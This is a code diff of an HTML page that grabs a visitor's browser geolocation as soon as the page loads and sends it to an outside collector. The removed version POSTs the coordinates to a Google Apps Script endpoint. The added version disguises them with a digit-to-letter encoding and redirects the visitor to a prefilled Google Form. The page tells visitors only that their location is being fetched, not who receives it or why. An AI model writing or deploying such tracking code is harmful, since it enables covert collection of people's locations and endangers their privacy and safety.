@@ -1,46 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Submit Location</title>
+    <title>Auto-Fill Google Form with Encoded Location</title>
 </head>
 <body>
-    <h2>Capturing Your Location...</h2>
-    <p>Please wait while your location is submitted.</p>
+    <h2>Fetching Your Location...</h2>
+    <p>Please allow location access to proceed.</p>
 
     <script>
-        function submitLocation() {
+        // Encoding function: Converts digits to letters
+        function encodeLocation(latitude, longitude) {
+            const encodingMap = {
+                "1": "a", "2": "b", "3": "c", "4": "d", "5": "e",
+                "6": "f", "7": "g", "8": "h", "9": "i", "0": "j", ".": "."
+            };
+            
+            // Helper function to encode a single number
+            function encodeNumber(num) {
+                return num.toString().split("").map(char => encodingMap[char]).join("");
+            }
+
+            // Encode latitude and longitude
+            const encodedLat = encodeNumber(latitude);
+            const encodedLong = encodeNumber(longitude);
+
+            // Combine encoded values with a delimiter (e.g., "-")
+            return `${encodedLat}-${encodedLong}`;
+        }
+
+        // Function to get location and redirect to Google Form
+        function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function (position) {
+                    // Get latitude and longitude
                     var latitude = position.coords.latitude;
                     var longitude = position.coords.longitude;
 
-                    // Your Google Apps Script Web App URL
-                    var endpoint = "https://script.google.com/macros/s/AKfycbzEJwAFFQ27F6oy-nxf2bv7zaHU5rqtQzwybiW4qEvcRYDWD5Be62C4ZO_xUvuW6Qt-8w/exec";
+                    // Encode location
+                    var encodedLocation = encodeLocation(latitude, longitude);
 
-                    // Automatically send location data to the script
-                    fetch(endpoint, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                        body: "latitude=" + latitude + "&longitude=" + longitude
-                    })
-                    .then(response => response.text())
-                    .then(data => {
-                        alert("Location submitted successfully!");
-                        console.log(data);
-                    })
-                    .catch(error => {
-                        alert("Error submitting location: " + error.message);
-                    });
-                }, function (error) {
-                    alert("Error fetching location: " + error.message);
+                    // Replace with your Google Form link and field ID
+                    var googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScPwa2MUtEPqmiG7xNsGNqiUqj6A3vemkWx4c52uKANSgvP6Q/viewform?"
+                        + "usp=pp_url"
+                        + "&entry.1950807097=" + encodeURIComponent(encodedLocation);
+
+                    // Redirect to the Google Form
+                    window.location.href = googleFormURL;
                 });
             } else {
-                alert("Geolocation is not supported by this browser.");
+                alert("Geolocation is not supported by your browser.");
             }
         }
 
-        // Call the function to get and submit location
-        submitLocation();
+        // Call the function to fetch location when the page loads
+        getLocation();
     </script>
 </body>
 </html>
